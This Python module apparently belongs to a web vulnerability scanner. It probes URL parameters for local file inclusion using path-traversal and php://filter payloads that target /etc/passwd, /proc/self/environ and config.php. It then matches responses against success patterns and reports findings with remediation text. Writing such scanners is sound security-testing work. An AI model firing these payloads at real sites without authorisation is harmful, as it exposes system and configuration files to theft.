"""
Vexor LFI/RFI Scanner
Local File Inclusion and Remote File Inclusion
"""
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from vexor.modules.base import BaseScanner, Finding


LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/hosts",
    "../../../proc/self/environ",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "/etc/hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
]

LFI_SUCCESS_PATTERNS = [
    r"root:x:0:0",
    r"daemon:x:",
    r"/bin/bash",
    r"/bin/sh",
    r"\[fonts\]",
    r"127\.0\.0\.1.*localhost",
    r"DOCUMENT_ROOT=",
]

LFI_PARAMS = [
    'file', 'page', 'include', 'path', 'template', 'view',
    'doc', 'document', 'folder', 'root', 'pg', 'style',
    'pdf', 'read', 'load', 'show', 'content', 'lang',
    'language', 'module', 'conf', 'config', 'layout',
]


class Scanner(BaseScanner):
    """LFI/RFI Scanner"""

    MODULE_NAME = "lfi"
    MODULE_DESC = "Local/Remote File Inclusion Detection"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_common_params(),
                return_exceptions=True
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        for param in params:
            if param.lower() in LFI_PARAMS:
                await self._test_lfi(self.target, param)

    async def _scan_common_params(self) -> None:
        for param in LFI_PARAMS[:8]:
            await self._test_lfi(self.target, param)

    async def _test_lfi(self, url: str, param: str) -> None:
        for payload in LFI_PAYLOADS[:8]:
            test_url = self._inject_param(url, param, payload)
            resp = await self.get(test_url)
            if not resp:
                continue
            if self._has_lfi_success(resp.text):
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln="Local File Inclusion (LFI)",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=self._extract_evidence(resp.text),
                    description=f"LFI in parameter '{param}' allows reading local files",
                    remediation=(
                        "Never use user input directly in file paths. "
                        "Use whitelist of allowed files. "
                        "Disable allow_url_include in PHP."
                    ),
                ))
                return

    def _has_lfi_success(self, text: str) -> bool:
        for pattern in LFI_SUCCESS_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _extract_evidence(self, text: str) -> str:
        for pattern in LFI_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 10)
                end = min(len(text), match.end() + 150)
                return text[start:end].strip()
        return "LFI indicator found"

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
